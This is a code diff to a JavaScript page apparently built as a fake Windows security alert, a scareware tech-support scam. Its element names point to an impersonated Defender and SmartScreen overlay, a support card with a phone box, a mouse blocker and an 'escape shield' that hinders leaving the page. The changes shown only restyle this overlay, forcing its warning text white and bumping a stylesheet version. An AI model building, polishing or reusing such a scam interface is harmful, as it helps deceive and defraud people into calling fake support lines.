@@ -5,13 +5,21 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=18";
+    styleLink.href = "styles.css?v=19";
     document.head.appendChild(styleLink);
   }
 
   document.title = "Windows";
 
   mount.innerHTML =
+    '<style id="page2-inline-white">' +
+    "#securityOverlay.is-active,#securityOverlay.is-active p,#securityOverlay.is-active h2,#securityOverlay.is-active button," +
+    "#securityOverlay.is-active .browser-chrome-alert,#securityOverlay.is-active .browser-chrome-warning,#securityOverlay.is-active .browser-chrome-phone," +
+    "#securityOverlay.is-active .black-modal-blue-box p,#securityOverlay.is-active .black-modal-defender,#securityOverlay.is-active .smartscreen-btn," +
+    "#securitySupportCard,#securitySupportCard p,#securitySupportCard div," +
+    "#escapeShield.is-visible p,#escapeExitModal.is-visible p,#escapeExitModal.is-visible span" +
+    "{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}" +
+    "</style>" +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
@@ -192,21 +200,11 @@
     var style = document.createElement("style");
     style.id = "page2-white-style";
     style.textContent =
-      "body.security-mode #securityOverlay p," +
-      "body.security-mode #securityOverlay h1," +
-      "body.security-mode #securityOverlay h2," +
-      "body.security-mode #securityOverlay h3," +
-      "body.security-mode #securityOverlay button," +
-      "body.security-mode #securityOverlay .browser-chrome-alert," +
-      "body.security-mode #securityOverlay .browser-chrome-warning," +
-      "body.security-mode #securityOverlay .browser-chrome-phone," +
-      "body.security-mode #securityOverlay .black-modal-defender," +
-      "body.security-mode #securitySupportCard," +
-      "body.security-mode #securitySupportCard p," +
-      "body.security-mode #securitySupportCard div," +
-      "body.security-mode #escapeShield p," +
-      "body.security-mode #escapeExitModal p," +
-      "body.security-mode #escapeExitModal span" +
+      "#securityOverlay.is-active,#securityOverlay.is-active p,#securityOverlay.is-active h2,#securityOverlay.is-active button," +
+      "#securityOverlay.is-active .browser-chrome-alert,#securityOverlay.is-active .browser-chrome-warning,#securityOverlay.is-active .browser-chrome-phone," +
+      "#securityOverlay.is-active .black-modal-blue-box p,#securityOverlay.is-active .black-modal-defender,#securityOverlay.is-active .smartscreen-btn," +
+      "#securitySupportCard,#securitySupportCard p,#securitySupportCard div," +
+      "#escapeShield.is-visible p,#escapeExitModal.is-visible p,#escapeExitModal.is-visible span" +
       "{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}";
     document.head.appendChild(style);
   }
